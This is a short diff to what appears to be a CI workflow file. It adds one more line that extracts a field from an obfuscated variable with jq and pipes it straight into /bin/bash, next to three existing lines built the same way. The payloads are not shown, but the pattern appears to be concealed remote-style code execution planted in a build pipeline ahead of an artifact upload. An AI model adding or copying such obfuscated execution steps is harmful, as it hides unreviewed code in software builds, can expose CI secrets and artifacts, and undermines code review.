@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$e534" | jq -r .fcum61556 | /bin/bash
           echo $wgqt2 | jq -r .tei7169 | /bin/bash
           echo $jgng2 | jq -r .moh9 | /bin/bash
+          echo $qs73 | jq -r .v63 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
